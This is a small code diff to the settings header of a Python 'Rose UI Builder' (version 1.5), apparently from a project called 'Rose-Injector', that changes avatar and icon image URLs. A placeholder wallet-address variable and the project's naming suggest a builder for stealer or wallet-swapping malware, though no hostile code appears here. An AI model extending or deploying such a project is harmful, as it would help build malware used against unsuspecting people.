@@ -47,10 +47,10 @@ logger = logging.getLogger(__name__)
 gumbobr0ts_wallet_adr = "MY WALLET ADRESS HERE"
 
 __title__ = 'Rose UI Builder'
-__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/readme/RoseWBG.png'
+__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/readme/$rose-b.png'
 __version__ = '1.5'
 __debugm__ = False # Change only if you are a dev 
-__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/tools/rose.png"
+__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/readme/$rose-wh.png"
 __devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/components/roseui/msg.txt").text.splitlines()[0].split(" - ")
 
 data_builder = {
